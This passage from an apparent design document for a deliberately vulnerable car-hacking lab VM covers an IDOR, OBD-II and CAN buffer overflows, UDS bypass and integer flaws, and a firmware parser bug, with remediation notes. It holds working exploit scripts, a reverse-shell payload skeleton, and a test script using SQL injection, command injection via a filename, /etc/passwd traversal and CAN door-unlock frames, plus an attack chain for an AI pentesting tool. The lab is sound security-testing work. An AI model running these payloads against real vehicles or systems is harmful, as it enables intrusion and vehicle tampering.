- Potentially modify other users' settings

**Sensitive Data Exposed**:
```
- Usernames
- Email addresses
- Phone numbers
- VIN (Vehicle Identification Number)
- Home address
- Preferred routes
- Usage history
```

**Business Impact**:
- Privacy violation
- Regulatory compliance issues (GDPR, CCPA)
- Reputation damage
- Potential lawsuits

### Remediation (For Documentation)

**Secure Code**:
```python
@app.route('/settings')
def settings():
    # Get requested user_id
    requested_user_id = request.args.get('user_id')
    
    # Get logged-in user's ID from session
    logged_in_user_id = session.get('user_id')
    
    # SECURE: Authorization check
    if requested_user_id and int(requested_user_id) != logged_in_user_id:
        # Check if user has admin privileges
        user = db.execute("SELECT role FROM users WHERE id=?", (logged_in_user_id,)).fetchone()
        if user[0] != 'admin':
            return "Unauthorized", 403
    
    # Proceed with authorized user_id
    user_id = requested_user_id or logged_in_user_id
    user = db.execute("SELECT * FROM users WHERE id=?", (user_id,)).fetchone()
    
    return render_template('settings.html', user=user)
```

**Alternative - Use UUIDs instead of sequential IDs**:
```python
# Generate random UUIDs instead of sequential integers
import uuid

user_uuid = str(uuid.uuid4())  # e.g., "550e8400-e29b-41d4-a716-446655440000"

# Much harder to guess than sequential IDs
```

### Validation

**API Endpoint**:
```bash
curl http://localhost:9999/validate/idor
# Returns: {"success": true, "accessed_user_ids": [1, 2, 3]}
```

**Manual Check**:
```bash
# Log in as driver (user_id=2)
curl -c cookies.txt -X POST http://localhost:8000/login \
  -d "username=driver&password=password"

# Try to access admin's settings (user_id=1)
curl -b cookies.txt "http://localhost:8000/settings?user_id=1"

# If response contains admin's data, IDOR exists
```

---

## V8: OBD-II Buffer Overflow (OPTIONAL - Advanced)

### Description
The OBD-II simulator has a buffer overflow vulnerability in the VIN request handler when processing oversized requests.

### Technical Details

**Location**: OBD simulator, TCP port 9555  
**Protocol**: OBD-II (ISO 15031)  
**Vulnerable Function**: `handle_vin_request()`

**Vulnerable Code** (obd_simulator.py):
```c
// Pseudocode (C-style for clarity)
char vin_buffer[17];  // VIN is exactly 17 characters

void handle_vin_request(char* input) {
    // VULNERABLE: No bounds checking
    strcpy(vin_buffer, input);  // If input > 17 bytes, overflow!
    
    send_response(vin_buffer);
}
```

**Python Implementation** (simulated vulnerability):
```python
def handle_vin_request(data):
    VIN_SIZE = 17
    vin_buffer = bytearray(VIN_SIZE)
    
    # VULNERABLE: Copy without length check
    if len(data) > VIN_SIZE:
        # Buffer overflow occurs here
        # In real scenario, this would overwrite adjacent memory
        raise BufferError("VIN request too large - overflow!")
    
    vin_buffer[:len(data)] = data
    return vin_buffer
```

### Why This is Realistic (But Less Common)

**Real-world examples**:
- Embedded systems often written in C/C++
- Legacy automotive code predates modern security practices
- OBD-II implementations vary widely (aftermarket devices vulnerable)

**However**:
- Modern Python/managed languages prevent classic buffer overflows
- Automotive OEMs increasingly use safe languages
- This is included as an **advanced/educational** vulnerability

**Note**: For the PoC VM, this vulnerability may be **simulated** (cause a crash/error) rather than fully exploitable for code execution, given the Python implementation.

### Discovery

**Method 1 - Fuzzing**:
```python
import socket

def fuzz_vin_request():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('localhost', 9555))
    
    # Send oversized VIN request
    payload = b'\x09\x02' + b'A' * 100  # Mode 09, PID 02, then 100 bytes
    sock.send(payload)
    
    try:
        response = sock.recv(1024)
        print(f"Response: {response}")
    except:
        print("Server crashed or disconnected - possible buffer overflow!")
    
    sock.close()

fuzz_vin_request()
```

**Method 2 - Metasploit Module** (if created):
```bash
use auxiliary/fuzzers/obd/vin_fuzzer
set RHOSTS localhost
set RPORT 9555
run
```

**AI Discovery Path** (Advanced):
```
1. Discover OBD port 9555
2. Connect and send standard PIDs
3. Reason: "Binary protocols often have buffer overflow vulns"
4. Fuzz VIN request with oversized data
5. Observe crash/error
6. Craft exploit for code execution
```

### Exploitation

**Proof-of-Concept - Crash**:
```python
import socket

def exploit_buffer_overflow():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('localhost', 9555))
    
    # Craft payload
    # Mode 09 (request vehicle info), PID 02 (VIN)
    payload = b'\x09\x02' + b'A' * 100
    
    sock.send(payload)
    
    # Server should crash or return error
    response = sock.recv(1024)
    print(f"Response: {response}")
    
    sock.close()

exploit_buffer_overflow()
```

**Advanced - Code Execution** (Theoretical):
```python
# This would require careful memory layout analysis
# Not realistic in Python, but shown for educational purposes

def craft_exploit():
    # NOP sled
    nop_sled = b'\x90' * 50
    
    # Shellcode (reverse shell)
    shellcode = b'\x31\xc0\x50\x68...'  # x86 shellcode
    
    # Return address (overwrite instruction pointer)
    ret_addr = b'\x78\x56\x34\x12'  # Little-endian address
    
    payload = nop_sled + shellcode + ret_addr
    return payload
```

### Impact

**Severity**: HIGH (if exploitable) / LOW (if just crashes)  
**CVSS Score**: 8.1 (High, if RCE) / 4.0 (Medium, if DoS only)

**If Exploitable (RCE)**:
- Execute arbitrary code on the system
- Gain shell access
- Full system compromise

**If Only DoS**:
- Crash the OBD service
- Deny diagnostic access
- Require service restart

**For This VM**:
- Likely just crashes/errors (Python limitations)
- Demonstrates concept for education
- Could be made fully exploitable in C implementation

### Remediation (For Documentation)

**Secure Code**:
```python
def handle_vin_request(data):
    VIN_SIZE = 17
    
    # SECURE: Validate length before processing
    if len(data) > VIN_SIZE:
        return error_response("VIN request too large")
    
    vin_buffer = bytearray(VIN_SIZE)
    vin_buffer[:len(data)] = data
    
    return vin_buffer
```

**C Implementation** (if using C):
```c
void handle_vin_request(char* input, size_t input_len) {
    char vin_buffer[17];
    
    // SECURE: Check length
    if (input_len > sizeof(vin_buffer)) {
        send_error("Request too large");
        return;
    }
    
    // SECURE: Use strncpy with explicit length
    strncpy(vin_buffer, input, sizeof(vin_buffer) - 1);
    vin_buffer[sizeof(vin_buffer) - 1] = '\0';  // Null terminate
    
    send_response(vin_buffer);
}
```

### Validation

**API Endpoint**:
```bash
curl http://localhost:9999/validate/buffer_overflow
# Returns: {"success": true, "service_crashed": true}
```

**Manual Check**:
```python
# Test if service is still running after exploit attempt
import socket

sock = socket.socket()
try:
    sock.connect(('localhost', 9555))
    print("Service still running")
except:
    print("Service crashed - buffer overflow successful")
```

---

## V9: UDS Security Bypass (Fuzzing Required)

### Description
The UDS (Unified Diagnostic Services) Gateway implements the standard ISO 14229 protocol. The Security Access service (0x27) has a hidden sub-function (0x05) that bypasses authentication when called in an invalid session state.

### Technical Details

**Location**: TCP port 9556 or CAN vcan0 (IDs 0x7DF/0x7E0-0x7E7)
**Protocol**: ISO 14229 UDS
**Service**: SecurityAccess (SID 0x27)
**Vulnerability**: State machine flaw in sub-function handling

### Why This is Realistic

**Real-world examples**:
- Multiple automotive ECUs have undocumented diagnostic functions
- State machine flaws in UDS implementations are common
- Hidden maintenance modes often bypass security

### Discovery

**Method - Protocol Fuzzing with Boofuzz**:
```python
from boofuzz import *

session = Session(target=Target(connection=TCPSocketConnection("localhost", 9556)))
session.connect(s_get("uds_request"))

s_initialize("uds_request")
s_byte(0x27, name="SID")       # SecurityAccess
s_byte(fuzzable=True, name="sub_function")  # Fuzz sub-functions
```

### Exploitation

```python
import socket

# Send hidden sub-function 0x05 to bypass security
s = socket.socket()
s.connect(('localhost', 9556))
s.send(b'\x27\x05')  # SecurityAccess with sub-function 0x05
response = s.recv(100)
# If vulnerable, returns positive response instead of NRC
```

### Validation

```bash
curl http://localhost:9999/validate/uds_security_bypass
# Returns: {"success": true, "bypass_detected": true}
```

---

## V10: CAN DLC Overflow (Fuzzing Required)

### Description
The CAN Frame Parser service monitors vcan0 for traffic analysis. It accepts CAN FD frames (up to 64 bytes of data) but copies frame data into a fixed 8-byte buffer using the DLC/length field without bounds checking, causing a buffer overflow when data exceeds 8 bytes.

### Technical Details

**Location**: vcan0 (CAN Frame Parser service)
**Vulnerability**: DLC field not validated, trusts CAN FD length field
**Buffer**: Fixed 8-byte `data_buffer`, but CAN FD frames can carry up to 64 bytes
**Interface**: vcan0 is configured with MTU 72 (CAN FD enabled)

### Why This is Realistic

**Real-world examples**:
- CAN FD allows larger payloads (up to 64 bytes), but legacy parsers still use 8-byte buffers
- Many CAN implementations trust the DLC field without validation
- Embedded systems often lack input validation when processing newer protocol extensions

### Discovery

**Method 1 - CAN FD Frame with cansend**:
```bash
# Send a CAN FD frame with 16 bytes of data (overflows 8-byte buffer)
# The ## syntax sends CAN FD frames; the 1 after ## sets the BRS flag
cansend vcan0 100##1.AABBCCDDEE112233445566778899
```

**Method 2 - CAN Frame Fuzzing with python-can**:
```python
import can

bus = can.interface.Bus(channel='vcan0', bustype='socketcan', fd=True)

# Send CAN FD frame with data > 8 bytes
msg = can.Message(
    arbitration_id=0x100,
    data=b'\xAA\xBB\xCC\xDD\xEE\x11\x22\x33\x44\x55\x66\x77\x88\x99',
    is_fd=True,
    is_extended_id=False
)
bus.send(msg)
```

### Exploitation

The CAN FD frame delivers more than 8 bytes of data. The parser copies the full length into an 8-byte buffer via `memcpy(data_buffer, frame->data, frame->can_dlc)`, causing a stack buffer overflow. The detection marker is logged before the overflow occurs, so the exploit is validated even if the parser crashes.

### Validation

```bash
curl http://localhost:9999/validate/can_dlc_overflow
# Returns: {"success": true, "overflow_detected": true}
```

---

## V11: UDS Integer Overflow (Fuzzing Required)

### Description
The UDS WriteDataByIdentifier service (0x2E) calculates data length from request size. Sending a request shorter than expected causes an integer underflow in the length calculation.

### Technical Details

**Location**: TCP port 9556 or CAN vcan0
**Service**: WriteDataByIdentifier (SID 0x2E)
**Vulnerability**: `data_len = request_len - 3` underflows when request_len < 3

### Why This is Realistic

**Real-world examples**:
- Integer overflow/underflow bugs are common in C code
- Length calculations often assume minimum request sizes
- Embedded systems rarely validate input lengths

### Discovery

**Method - Fuzzing with short requests**:
```python
import socket

# Send WriteDataByIdentifier with only 1 byte (too short)
s = socket.socket()
s.connect(('localhost', 9556))
s.send(b'\x2E')  # Only SID, missing DID bytes
# This causes: data_len = 1 - 3 = underflow (wraps to large value)
```

### Validation

```bash
curl http://localhost:9999/validate/uds_integer_overflow
# Returns: {"success": true, "overflow_detected": true}
```

---

## V12: Firmware Header Overflow (Fuzzing Required)

### Description
The UDS firmware download service parses firmware headers in TransferData blocks. The `name_len` field is not validated, allowing a buffer overflow when parsing firmware names.

### Technical Details

**Location**: TCP port 9556 or CAN vcan0
**Services**: RequestDownload (0x34), TransferData (0x36)
**Vulnerability**: Firmware header `name_len` field not bounds-checked

**Firmware Header Format**:
```
Offset  Size  Description
0       4     Magic number
4       2     Version
6       2     Name length (not validated!)
8       N     Firmware name (overflows if name_len > buffer)
```

### Why This is Realistic

**Real-world examples**:
- File format parsing bugs are extremely common
- Firmware update mechanisms are high-value targets
- Length fields are frequently trusted without validation

### Discovery

**Method - Firmware Format Fuzzing with Radamsa**:
```bash
# Create seed firmware header
echo -ne '\x00\x00\x00\x00\x00\x01\xFF\xFFAAAAAAAAAAAA' > seed.bin

# Mutate with Radamsa
radamsa seed.bin > fuzzed.bin

# Send via UDS TransferData
python3 send_firmware.py fuzzed.bin
```

### Exploitation

```python
import socket

def exploit_firmware_overflow():
    s = socket.socket()
    s.connect(('localhost', 9556))

    # Enter programming session
    s.send(b'\x10\x02')
    s.recv(100)

    # Request download
    s.send(b'\x34\x00\x00\x00\x00\x00\x00\x00\x00')
    s.recv(100)

    # Send malformed firmware header with huge name_len
    header = b'\x00\x00\x00\x00'  # Magic
    header += b'\x00\x01'         # Version
    header += b'\xFF\xFF'         # name_len = 65535 (overflow!)
    header += b'A' * 100          # Partial name data

    s.send(b'\x36\x01' + header)  # TransferData block 1

exploit_firmware_overflow()
```

### Validation

```bash
curl http://localhost:9999/validate/uds_firmware_overflow
# Returns: {"success": true, "overflow_detected": true}
```

---

## Vulnerability Testing Checklist

Before deploying the VM, validate all vulnerabilities:
```bash
#!/bin/bash
# test_vulnerabilities.sh

echo "[+] Testing Vulnerability 1: SSH Default Credentials..."
sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@localhost 'echo SUCCESS' && echo "✓ V1 WORKS" || echo "✗ V1 FAILED"
V1=$(curl -s http://localhost:9999/validate/ssh_access | jq -r '.success')
[[ "$V1" == "true" ]] && echo "✓ V1 VALIDATED" || echo "✗ V1 VALIDATION FAILED"

echo "[+] Testing Vulnerability 2: SQL Injection..."
RESPONSE=$(curl -s -X POST http://localhost:8000/login -d "username=' OR '1'='1' --&password=x")
[[ "$RESPONSE" == *"dashboard"* ]] && echo "✓ V2 WORKS" || echo "✗ V2 FAILED"

echo "[+] Testing Vulnerability 3: CAN No Auth..."
cansend vcan0 19B#00000000FFFFFFFF
sleep 1
DOORS=$(curl -s http://localhost:9999/status | jq -r '.can.doors.fl')
[[ "$DOORS" == "true" ]] && echo "✓ V3 WORKS" || echo "✗ V3 FAILED"

echo "[+] Testing Vulnerability 4: CAN Replay..."
for i in $(seq 1 10); do cansend vcan0 19B#00000000FFFFFFFF; done
sleep 1
REPLAY=$(curl -s http://localhost:9999/validate/can_replay | jq -r '.success')
[[ "$REPLAY" == "true" ]] && echo "✓ V4 WORKS" || echo "✗ V4 FAILED"

echo "[+] Testing Vulnerability 5: Directory Traversal..."
RESPONSE=$(curl -s -F "file=@/dev/null;filename=../../../etc/passwd" http://localhost:8080/firmware/upload)
[[ "$RESPONSE" == *"root:"* ]] && echo "✓ V5 WORKS" || echo "✗ V5 FAILED"

echo "[+] Testing Vulnerability 6: Command Injection..."
curl -s -F "file=@/dev/null" -F "filename=test.jpg; touch /tmp/v6test #.jpg" http://localhost:8000/upload
[[ -f /tmp/v6test ]] && echo "✓ V6 WORKS" || echo "✗ V6 FAILED"

echo "[+] Testing Vulnerability 7: IDOR..."
curl -c /tmp/cookies.txt -s -X POST http://localhost:8000/login -d "username=driver&password=password" > /dev/null
RESPONSE=$(curl -b /tmp/cookies.txt -s "http://localhost:8000/settings?user_id=1")
[[ "$RESPONSE" == *"admin"* ]] && echo "✓ V7 WORKS" || echo "✗ V7 FAILED"

echo "[+] Testing Vulnerability 8: Buffer Overflow..."
python3 -c "import socket; s=socket.socket(); s.connect(('localhost',9555)); s.send(b'\x09\x0A' + b'A'*100)"
OVERFLOW=$(curl -s http://localhost:9999/validate/buffer_overflow | jq -r '.success')
[[ "$OVERFLOW" == "true" ]] && echo "✓ V8 WORKS" || echo "✗ V8 FAILED"

echo "[+] Testing Vulnerability 9: UDS Security Bypass (requires fuzzing)..."
python3 -c "import socket; s=socket.socket(); s.connect(('localhost',9556)); s.send(b'\x27\x05')"
BYPASS=$(curl -s http://localhost:9999/validate/uds_security_bypass | jq -r '.success')
[[ "$BYPASS" == "true" ]] && echo "✓ V9 WORKS" || echo "✗ V9 FAILED (may need fuzzing)"

echo "[+] Testing Vulnerability 10: CAN DLC Overflow (requires vcan0 with CAN FD)..."
cansend vcan0 100##1.AABBCCDDEE112233445566778899
sleep 1
DLC=$(curl -s http://localhost:9999/validate/can_dlc_overflow | jq -r '.success')
[[ "$DLC" == "true" ]] && echo "✓ V10 WORKS" || echo "✗ V10 FAILED"

echo "[+] Testing Vulnerability 11: UDS Integer Overflow..."
python3 -c "import socket; s=socket.socket(); s.connect(('localhost',9556)); s.send(b'\x2E')"
INT_OVERFLOW=$(curl -s http://localhost:9999/validate/uds_integer_overflow | jq -r '.success')
[[ "$INT_OVERFLOW" == "true" ]] && echo "✓ V11 WORKS" || echo "✗ V11 FAILED"

echo "[+] Testing Vulnerability 12: Firmware Header Overflow..."
FW=$(curl -s http://localhost:9999/validate/uds_firmware_overflow | jq -r '.success')
[[ "$FW" == "true" ]] && echo "✓ V12 WORKS" || echo "○ V12 NOT TRIGGERED (requires fuzzing)"

echo ""
echo "[+] All vulnerability tests complete!"
```

---

## Summary Table

| Vuln | Priority | AI Solvable? | Demo Value | Educational Value |
|------|----------|--------------|------------|-------------------|
| V1 - SSH Default Creds | MUST HAVE | ✓✓✓ High | ✓✓✓ High | ✓✓ Medium |
| V2 - SQL Injection | MUST HAVE | ✓✓✓ High | ✓✓ Medium | ✓✓✓ High |
| V2-B - Blind SQL Injection | SHOULD HAVE | ✓✓ Medium | ✓✓ Medium | ✓✓✓ High |
| V3 - CAN No Auth | MUST HAVE | ✓✓✓ High | ✓✓✓ High | ✓✓✓ High |
| V4 - CAN Replay | SHOULD HAVE | ✓✓ Medium | ✓✓ Medium | ✓✓✓ High |
| V5 - Directory Traversal (WAF) | SHOULD HAVE | ✓✓ Medium | ✓✓ Medium | ✓✓ Medium |
| V6 - Command Injection | SHOULD HAVE | ✓✓ Medium | ✓✓ Medium | ✓✓✓ High |
| V6-V2 - Vulnerability Chain | SHOULD HAVE | ✓✓ Medium | ✓✓✓ High | ✓✓✓ High |
| V7 - IDOR | SHOULD HAVE | ✓✓ Medium | ✓ Low | ✓✓ Medium |
| V8 - Buffer Overflow | SHOULD HAVE | ✓ Low | ✓✓ Medium | ✓✓✓ High |
| V9 - UDS Security Bypass | SHOULD HAVE | Fuzzing | ✓✓ Medium | ✓✓✓ High |
| V10 - CAN DLC Overflow | SHOULD HAVE | Fuzzing | ✓✓ Medium | ✓✓✓ High |
| V11 - UDS Integer Overflow | SHOULD HAVE | Fuzzing | ✓✓ Medium | ✓✓✓ High |
| V12 - Firmware Header Overflow | SHOULD HAVE | Fuzzing | ✓✓ Medium | ✓✓✓ High |

**Web/Network Vulnerabilities**: V1-V8 (manual pentesting)
**Fuzzing Vulnerabilities**: V9-V12 (require automated fuzzing tools)
**All Vulnerabilities**: V1-V12 (complete testbed)

---

## Attack Chain Example

The AI tool could chain vulnerabilities:
```
1. nmap → discover SSH (V1)
2. SSH login → gain shell access
3. Discover web app running on port 8000
4. SQLi (V2) → bypass auth, access admin panel
5. Command injection (V6) → execute commands as web app user
6. Escalate to root (if possible)
7. Access CAN interface (V3)
8. Send unlock command → doors unlock
9. Directory traversal (V5) → extract sensitive files
10. Replay attack (V4) → maintain access to vehicle

OBJECTIVE ACHIEVED: Full vehicle compromise
```

### Fuzzing Attack Chain (V9-V12)
```
1. Connect to UDS Gateway (port 9556)
2. Protocol fuzzing with Boofuzz → discover V9 security bypass
3. Fuzz sub-function values → trigger state machine flaw
4. Fuzz WriteDataByIdentifier lengths → trigger V11 integer overflow
5. Fuzz firmware headers → trigger V12 buffer overflow
6. CAN frame fuzzing → trigger V10 DLC overflow

OBJECTIVE ACHIEVED: Service crashes demonstrating memory corruption vulnerabilities
```

This demonstrates **multi-stage attack capability** of the AI tool and the importance of fuzzing for discovering hidden vulnerabilities.
